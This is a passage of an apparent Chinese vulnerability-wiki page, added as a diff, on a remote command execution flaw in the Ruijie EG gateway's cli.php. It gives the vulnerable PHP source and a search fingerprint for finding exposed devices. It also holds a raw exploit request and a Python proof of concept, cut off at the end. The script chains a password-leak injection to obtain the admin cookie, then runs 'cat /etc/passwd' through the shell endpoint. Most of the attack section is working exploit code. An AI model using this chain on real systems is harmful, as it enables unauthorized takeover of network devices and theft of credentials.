@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%20EG%E6%98%93%E7%BD%91%E5%85%B3%20cli.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>锐捷 EG易网关 cli.php 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u9510\u6377 EG\u6613\u7f51\u5173 cli.php \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%94%90%E6%8D%B7%20EG%E6%98%93%E7%BD%91%E5%85%B3%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%94%90%E6%8D%B7%20EG%E6%98%93%E7%BD%91%E5%85%B3%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷 EG易网关 download.php 任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%94%90%E6%8D%B7%20EG%E6%98%93%E7%BD%91%E5%85%B3%20branch_passw.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%94%90%E6%8D%B7%20EG%E6%98%93%E7%BD%91%E5%85%B3%20branch_passw.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
+        锐捷 EG易网关 branch_passw.php 远程命令执行
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="eg-cliphp">锐捷 EG易网关 cli.php 远程命令执行漏洞<a class="headerlink" href="#eg-cliphp" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>锐捷EG易网关 cli.php存在命令执行漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞 达到RCE控制服务器</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>锐捷EG易网关
+</code></pre></div>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;Ruijie-EG易网关&quot;
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞)</p>
+<p>漏洞文件 cli.php</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="sd">/**</span>
+<span class="sd"> * cli命令查询</span>
+<span class="sd"> */</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;IN&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>     <span class="c1">//定位该文件是入口文件</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DS&#39;</span><span class="p">,</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;AROOT&#39;</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="nx">DS</span><span class="p">);</span>
+<span class="k">include_once</span><span class="p">(</span><span class="nx">AROOT</span> <span class="o">.</span> <span class="s1">&#39;mvc&#39;</span> <span class="o">.</span> <span class="nx">DS</span> <span class="o">.</span> <span class="s1">&#39;controller&#39;</span> <span class="o">.</span> <span class="nx">DS</span> <span class="o">.</span> <span class="s1">&#39;core.controller.php&#39;</span><span class="p">);</span>
+
+<span class="k">class</span> <span class="nc">defaultController</span> <span class="k">extends</span> <span class="nx">coreController</span> <span class="p">{</span>
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+<span class="c1">// 载入默认的</span>
+        <span class="k">parent</span><span class="o">::</span><span class="na">__construct</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="sd">/**</span>
+<span class="sd">     * cli命令执行</span>
+<span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">indexAction</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$mode</span> <span class="o">=</span> <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;mode_url&quot;</span><span class="p">);</span>
+        <span class="nv">$command</span> <span class="o">=</span> <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;command&quot;</span><span class="p">);</span>
+        <span class="nv">$answer</span> <span class="o">=</span> <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;answer&quot;</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">==</span> <span class="k">false</span><span class="p">)</span>
+            <span class="nv">$mode</span> <span class="o">=</span> <span class="s2">&quot;exec&quot;</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$answer</span> <span class="o">==</span> <span class="k">false</span><span class="p">)</span>
+            <span class="nv">$answer</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$command</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
+            <span class="nv">$command</span> <span class="o">=</span> <span class="nb">iconv</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="s1">&#39;GBK//IGNORE&#39;</span><span class="p">,</span> <span class="nv">$command</span><span class="p">);</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nx">execCli</span><span class="p">(</span><span class="nv">$mode</span><span class="p">,</span> <span class="nv">$command</span><span class="p">,</span> <span class="nv">$answer</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;status&quot;</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">json_echo</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+            <span class="k">exit</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="nv">$res</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;/%01/&quot;</span><span class="p">,</span> <span class="s2">&quot;/%22/&quot;</span><span class="p">,</span> <span class="s2">&quot;/%09/&quot;</span><span class="p">,</span> <span class="s2">&quot;/%0D/&quot;</span><span class="p">,</span> <span class="s2">&quot;/%3A/&quot;</span><span class="p">,</span><span class="s2">&quot;/%07/&quot;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">]));</span> <span class="c1">//先进行url编码防止gbk中文无法json,再过滤首尾空方块</span>
+        <span class="nv">$resArr</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;%0A&quot;</span><span class="p">,</span> <span class="nv">$res</span><span class="p">);</span>
+        <span class="c1">//$resArr = preg_split(&quot;/\r\n|\n/&quot;, $data[&quot;data&quot;]);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">==</span> <span class="s2">&quot;config&quot;</span> <span class="o">&amp;&amp;</span> <span class="nb">strstr</span><span class="p">(</span><span class="nv">$resArr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s2">&quot;Enter+configuration+commands%2C+one+per+line.++End+with+CNTL%2FZ.&quot;</span><span class="p">))</span>
+            <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$resArr</span><span class="p">);</span>
+        <span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$resArr</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">headers_sent</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: text/json;charset=gbk&quot;</span><span class="p">);</span>
+            <span class="c1">//header(&quot;Expires: Thu, 01 Jan 1970 00:00:01 GMT&quot;);</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: no-cache, must-revalidate&quot;</span><span class="p">);</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Pragma: no-cache&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
+        <span class="c1">//echo json_encode($data);</span>
+    <span class="p">}</span>
+
+    <span class="sd">/**</span>
+<span class="sd">     * 执行shell脚本</span>
+<span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">shellAction</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$command</span> <span class="o">=</span> <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;command&quot;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$command</span> <span class="o">==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;status&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+            <span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;msg&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;no command&quot;</span><span class="p">;</span>
+            <span class="nx">json_echo</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+            <span class="k">exit</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="nv">$content</span> <span class="o">=</span> <span class="p">[];</span>
+        <span class="nb">exec</span><span class="p">(</span><span class="nx">EscapeShellCmd</span><span class="p">(</span><span class="nv">$command</span><span class="p">),</span> <span class="nv">$content</span><span class="p">);</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;status&quot;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+            <span class="s2">&quot;data&quot;</span> <span class="o">=&gt;</span> <span class="nv">$content</span><span class="p">);</span>
+        <span class="nx">json_echo</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="sd">/**</span>
+<span class="sd">     * 获取系统时间</span>
+<span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">dateAction</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nx">setTimeZone</span><span class="p">();</span>
+        <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;status&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">][</span><span class="s2">&quot;time&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s&quot;</span><span class="p">);</span>
+        <span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">][</span><span class="s2">&quot;zone&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;UTC&quot;</span> <span class="o">.</span> <span class="nx">getTimeZone</span><span class="p">();</span>
+        <span class="nx">json_echo</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="sd">/**</span>
+<span class="sd">     * 获取系统时区</span>
+<span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">datezoneAction</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;status&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+        <span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">getTimeZone</span><span class="p">();</span>
+        <span class="nx">json_echo</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="sd">/**</span>
+<span class="sd">     * 检测静态页面时候未登录直接进入</span>
+<span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">checkloginAction</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nx">json_echo</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;status&quot;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">));</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="k">include_once</span><span class="p">(</span><span class="nx">AROOT</span> <span class="o">.</span> <span class="s2">&quot;init.php&quot;</span><span class="p">);</span>     <span class="c1">//mvc初始化入口，放在底部</span>
+</code></pre></div>
+<p>关键部分代码为</p>
+<div class="highlight"><pre><span></span><code><span class="x">/**</span>
+<span class="x">     * 执行shell脚本</span>
+<span class="x">     */</span>
+<span class="x">    public function shellAction() {</span>
+<span class="x">        $command = p(&quot;command&quot;);</span>
+<span class="x">        if ($command == false) {</span>
+<span class="x">            $data[&quot;status&quot;] = 2;</span>
+<span class="x">            $data[&quot;msg&quot;] = &quot;no command&quot;;</span>
+<span class="x">            json_echo($data);</span>
+<span class="x">            exit();</span>
+<span class="x">        }</span>
+<span class="x">        $content = [];</span>
+<span class="x">        exec(EscapeShellCmd($command), $content);</span>
+<span class="x">        $data = array(&quot;status&quot; =&gt; true,</span>
+<span class="x">            &quot;data&quot; =&gt; $content);</span>
+<span class="x">        json_echo($data);</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>command参数直接传入执行了命令</p>
+<p>发送请求包</p>
+<div class="highlight"><pre><span></span><code>POST /cli.php?a=shell HTTP/1.1
+Host: 
+User-Agent: Go-http-client/1.1
+Content-Length: 24
+Content-Type: application/x-www-form-urlencoded
+Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin; 
+X-Requested-With: XMLHttpRequest
+Accept-Encoding: gzip
+
+notdelay=true&amp;command=id
+</code></pre></div>
+<p><img alt="" src="../images/202202110929756.png" /></p>
+<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
+<span class="c1">#-*- coding:utf-8 -*-</span>
+<span class="c1"># author : PeiQi</span>
+<span class="c1"># from   : http://wiki.peiqi.tech</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">title</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mPOC_Des: http://wiki.peiqi.tech                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mGithub : https://github.com/PeiQi0                                 </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34m公众号  : PeiQi文库                                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mVersion: 锐捷EG网关 cli.php RCE                                      </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36m使用格式:  python3 poc.py                                            </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+    <span class="n">vuln_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/login.php&quot;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span>
+    <span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;username=admin&amp;password=admin?show+webmaster+user&#39;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[36m[o] 正在执行 show webmaster user </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target_url</span><span class="p">))</span>
+        <span class="k">if</span> <span class="s2">&quot;data&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="n">password</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;admin (.*?)&quot;&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[36m[o] 成功获取, 账号密码为:  admin   </span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
+            <span class="n">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">vuln_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/login.php&quot;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span>
+    <span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;username=admin&amp;password=</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[36m[o] 正在登录..... </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target_url</span><span class="p">))</span>
+        <span class="k">if</span> <span class="s2">&quot;status&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="s2">&quot;1&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="n">ruijie_cookie</span> <span class="o">=</span> <span class="s2">&quot;RUIJIEID=&quot;</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;&#39;Set-Cookie&#39;: &#39;RUIJIEID=(.*?);&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;;user=admin;&quot;</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[36m[o] 成功获取管理员Cookie: </span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ruijie_cookie</span><span class="p">))</span>
+            <span class="n">POC_3</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">ruijie_cookie</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">POC_3</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">ruijie_cookie</span><span class="p">):</span>
+    <span class="n">vuln_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&quot;/cli.php?a=shell&quot;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;Cookie&quot;</span><span class="p">:</span> <span class="s2">&quot;</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ruijie_cookie</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;notdelay=true&amp;command=cat /etc/passwd&#39;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[36m[o] 正在执行 cat /etc/passwd..... </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target_url</span><span class="p">))</span>
+        <span class="k">if</span> <span class="s2">&quot;root:&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[36m[o] 成功读取 /etc/passwd </span><span class="se">\n</span><span class="s2">[o] 响应为:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">))</span>
+
